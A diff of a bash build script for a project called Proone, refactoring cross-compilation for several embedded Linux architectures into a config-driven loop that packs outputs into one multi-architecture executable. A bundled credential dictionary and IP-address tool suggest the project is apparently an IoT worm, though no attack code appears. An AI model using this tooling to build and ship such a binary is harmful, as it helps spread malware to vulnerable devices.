@@ -5,86 +5,6 @@
 # \note xcomp is required for this script to function.
 set -e # die on error
 
-##
-# \note \c ARCH_ARR, \c TOOLCHAIN_ARR and \c HOST_ARR form tuples of target
-# arches. \c ARCH_ARR lists the name of the arches to be used for the output
-# files(suffix). \c TOOLCHAIN_ARR lists the \b xcomp targets for each arch.
-# \c HOST_ARR is the list of the toolchain prefixes.
-ARCH_ARR=(
-#	"aarch64"
-	"armv4t"
-#	"armv7"
-	"i686"
-#	"x86_64"
-	"m68k"
-	"mips"
-	"mpsl"
-	"ppc"
-	"sh4"
-)
-TOOLCHAIN_ARR=(
-#	"aarch64"
-	"armv4t"
-#	"armv7"
-	"i686"
-#	"x86_64"
-	"m68k"
-	"mips"
-	"mpsl"
-	"ppc"
-	"sh4"
-)
-HOST_ARR=(
-#	"aarch64-linux"
-	"arm-linux"
-#	"arm-linux"
-	"i686-linux"
-#	"x86_64-linux"
-	"m68k-linux"
-	"mips-linux"
-	"mipsel-linux"
-	"powerpc-linux"
-	"sh4-linux"
-)
-# Length check. All three arrays must have the same number of elements.
-ARR_SIZE="${#ARCH_ARR[@]}"
-if [ $ARR_SIZE -ne "${#TOOLCHAIN_ARR[@]}" ] ||
-	[ $ARR_SIZE -ne "${#HOST_ARR[@]}" ];
-then
-	echo "Config error: arrays" >&2
-	exit 2
-fi
-
-# The root prefix. Note that the script is run from the project root directory.
-PROONE_PREFIX="builds"
-# The prefix to debug symbol files
-PROONE_DEBUG_SYM_DIR="$PROONE_PREFIX/debug"
-# The prefix to Proone executables
-PROONE_EXEC_DIR="$PROONE_PREFIX/proone.bin"
-# The prefix to native tools
-PROONE_TOOLS_DIR="$PROONE_PREFIX/tools"
-# The prefix to miscellaneous executables for target
-PROONE_MISC_BIN_DIR="$PROONE_PREFIX/misc"
-# The name of the directory for release build Proone executables
-PROONE_REL_DIR="$PROONE_PREFIX/proone"
-# The prefix to debug symbol files
-export PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM_DIR/"
-# The prefix to all stripped executables
-export PROONE_EXEC_PREFIX="$PROONE_EXEC_DIR/stripped"
-# The prefix to the original Proone executable output by the compiler
-export PROONE_ENTIRE_PREFIX="$PROONE_EXEC_DIR/entire"
-# The prefix to the disassembler output
-export PROONE_ASM_PREFIX="$PROONE_EXEC_DIR/asm"
-# The prefix to the readelf output
-export PROONE_READELF_PREFIX="$PROONE_EXEC_DIR/readelf"
-# The prefix to the miscellaneous executables
-export PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN_DIR/"
-# The prefix to the names of the release build Proon executables
-PROONE_REL_PREFIX="$PROONE_REL_DIR/proone"
-# The path to the cred dict binary file
-PROONE_CDICT="$PROONE_PREFIX/cred_dict.bin"
-# The path to the dvault binary file
-PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"
 # The array of the native tools
 PROONE_TOOLS="
 	proone-pack
@@ -94,11 +14,70 @@ PROONE_TOOLS="
 	proone-ipaddr-arr
 "
 
+# Determine the default "include path"
+# Set this variable to use paths other than the directory in which the script is
+# located.
+if [ -z "$INC_DIR" ]; then
+	INC_DIR="$(dirname "${BASH_SOURCE[0]}")"
+fi
+INC_CONF="$INC_DIR/build-all.conf.sh"
+
+if [ $# -ne 0 ]; then
+	cat >&2 << EOF
+Proone build-all script. Build all configured target executables and pack them
+into one final FatELF-style executable for release.
+Usage: $0
+Config: $INC_CONF
+
+This script requires that no argument is passed in order to run.
+EOF
+	exit 2
+fi
+
+# Load config
+if [ -f "$INC_CONF" ]; then
+	. "$INC_CONF"
+else
+	echo "$INC_CONF: no such file" >&2
+	exit 1
+fi
+
+# Length check
+LEN_BUILD_TARGET="${#BUILD_TARGETS[@]}"
+if [ $LEN_BUILD_TARGET -le 0 ]; then
+	echo "No target specified" >&2
+	exit 2
+fi
+
+# Set defaults
+[ -z "$PROONE_PREFIX" ] && PROONE_PREFIX="builds"
+[ -z "$PROONE_DEBUG_SYM_DIR" ] && PROONE_DEBUG_SYM_DIR="$PROONE_PREFIX/debug"
+[ -z "$PROONE_EXEC_DIR" ] && PROONE_EXEC_DIR="$PROONE_PREFIX/proone.bin"
+[ -z "$PROONE_TOOLS_DIR" ] && PROONE_TOOLS_DIR="$PROONE_PREFIX/tools"
+[ -z "$PROONE_MISC_BIN_DIR" ] && PROONE_MISC_BIN_DIR="$PROONE_PREFIX/misc"
+[ -z "$PROONE_REL_DIR" ] && PROONE_REL_DIR="$PROONE_PREFIX/proone"
+[ -z "$PROONE_DEBUG_SYM_PREFIX" ] && PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM_DIR/"
+[ -z "$PROONE_EXEC_PREFIX" ] && PROONE_EXEC_PREFIX="$PROONE_EXEC_DIR/stripped"
+[ -z "$PROONE_ENTIRE_PREFIX" ] && PROONE_ENTIRE_PREFIX="$PROONE_EXEC_DIR/entire"
+[ -z "$PROONE_ASM_PREFIX" ] && PROONE_ASM_PREFIX="$PROONE_EXEC_DIR/asm"
+[ -z "$PROONE_READELF_PREFIX" ] && PROONE_READELF_PREFIX="$PROONE_EXEC_DIR/readelf"
+[ -z "$PROONE_MISC_BIN_PREFIX" ] && PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN_DIR/"
+[ -z "$PROONE_REL_PREFIX" ] && PROONE_REL_PREFIX="$PROONE_REL_DIR/proone"
+[ -z "$PROONE_CDICT" ] && PROONE_CDICT="$PROONE_PREFIX/cred_dict.bin"
+[ -z "$PROONE_DVAULT" ] && PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"
+
+export PROONE_DEBUG_SYM_PREFIX
+export PROONE_EXEC_PREFIX
+export PROONE_ENTIRE_PREFIX
+export PROONE_ASM_PREFIX
+export PROONE_READELF_PREFIX
+export PROONE_MISC_BIN_PREFIX
+
 ################################################################################
 
 # Drop the root directory and set up the skeleton
 rm -rf "$PROONE_PREFIX"
-mkdir\
+mkdir \
 	"$PROONE_PREFIX"\
 	"$PROONE_DEBUG_SYM_DIR"\
 	"$PROONE_EXEC_DIR"\
@@ -128,13 +107,13 @@ make distclean
 DVAULT_SIZE=$(stat -c "%s" "$PROONE_DVAULT")
 
 # Build all targets
-for (( i = 0; i < ARR_SIZE; i += 1 )); do
-	PROONE_BIN_OS="linux"\
-	PROONE_HOST="${HOST_ARR[$i]}"\
-	PROONE_BIN_ARCH="${ARCH_ARR[$i]}"\
-	xcomp linux-app\
-		"${TOOLCHAIN_ARR[$i]}"\
-		"scripts/build-arch.sh"
+for (( i = 0; i < LEN_BUILD_TARGET; i += 1 )); do
+	read -ra tpl <<< "${BUILD_TARGETS[i]}"
+
+	PROONE_BIN_OS="${tpl[0]}" \
+	PROONE_BIN_ARCH="${tpl[1]}" \
+	PROONE_HOST="${tpl[4]}" \
+		xcomp "${tpl[2]}" "${tpl[3]}" "scripts/build-arch.sh"
 done
 
 # Do pack
